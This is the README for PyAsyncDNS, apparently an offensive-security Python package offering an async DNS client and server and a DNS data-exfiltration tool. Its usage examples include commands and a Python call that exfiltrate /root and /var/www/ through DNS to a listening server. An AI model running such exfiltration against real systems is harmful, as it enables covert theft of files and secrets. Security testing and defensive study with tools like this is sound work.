![PyAsyncDNS Logo](https://mauricelambert.github.io/info/python/security/PyAsyncDNS/PyAsyncDNS_small.png "PyAsyncDNS logo")

# PyAsyncDNS

## Description

This package implements a basic asynchronous DNS client and server
with a feature to exfiltrate data through DNS.

## Requirements

This package require:

 - python3
 - python3 Standard Library

## Installation

### Pip

```bash
python3 -m pip install PyAsyncDNS
```

### Git

```bash
git clone "https://github.com/mauricelambert/PyAsyncDNS.git"
cd "PyAsyncDNS"
python3 -m pip install .
```

### Wget

```bash
wget https://github.com/mauricelambert/PyAsyncDNS/archive/refs/heads/main.zip
unzip main.zip
cd PyAsyncDNS-main
python3 -m pip install .
```

### cURL

```bash
curl -O https://github.com/mauricelambert/PyAsyncDNS/archive/refs/heads/main.zip
unzip main.zip
cd PyAsyncDNS-main
python3 -m pip install .
```

## Usages

### Command line

```bash
PyAsyncDNS              # Using CLI package executable
python3 -m PyAsyncDNS   # Using python module
python3 PyAsyncDNS.pyz  # Using python executable
PyAsyncDNS.exe          # Using python Windows executable

python3 -m PyAsyncDNS.client example.com kernel.org
PyAsyncDNS client example.com kernel.org

python3 -m PyAsyncDNS.server 127.0.0.1 53
PyAsyncDNS server 127.0.0.1 53

python3 -m PyAsyncDNS.exfiltrator 127.0.0.1 53 /root /var/www/
PyAsyncDNS exfiltration 127.0.0.1 53 /root /var/www/

python3 -m PyAsyncDNS.exfiltrator_server 127.0.0.1 53
PyAsyncDNS exfiltration-server 127.0.0.1 53 /root /var/www/
```

### Python script

```python
from PyAsyncDNS import *
from asyncio import run

addresses = run(resolve_all(['example.com', 'kernel.org'])) # resolve address
run(start_async_dns_server('127.0.0.1', 53))                # start server

server.get_response = lambda domain_name, transaction_id: "127.0.0.1"
run(start_async_dns_server('127.0.0.1', 53))                # start server with custom behaviour to define response

run(exfiltrate_directories(['/root', '/var/www/'], "127.0.0.1", 53)) # exfiltrate /root and /var/www/ directories through DNS to 127.0.0.1:53 using UDP
```

## Links

 - [Pypi](https://pypi.org/project/PyAsyncDNS)
 - [Github](https://github.com/mauricelambert/PyAsyncDNS)
 - [Documentation client](https://mauricelambert.github.io/info/python/security/PyAsyncDNS/client.html)
 - [Documentation server](https://mauricelambert.github.io/info/python/security/PyAsyncDNS/server.html)
 - [Documentation exfiltrator](https://mauricelambert.github.io/info/python/security/PyAsyncDNS/exfiltrator.html)
 - [Documentation exfiltrator server](https://mauricelambert.github.io/info/python/security/PyAsyncDNS/exfiltrator_server.html)
 - [Python executable](https://mauricelambert.github.io/info/python/security/PyAsyncDNS/PyAsyncDNS.pyz)
 - [Python Windows executable](https://mauricelambert.github.io/info/python/security/PyAsyncDNS/PyAsyncDNS.exe)

## License

Licensed under the [GPL, version 3](https://www.gnu.org/licenses/).
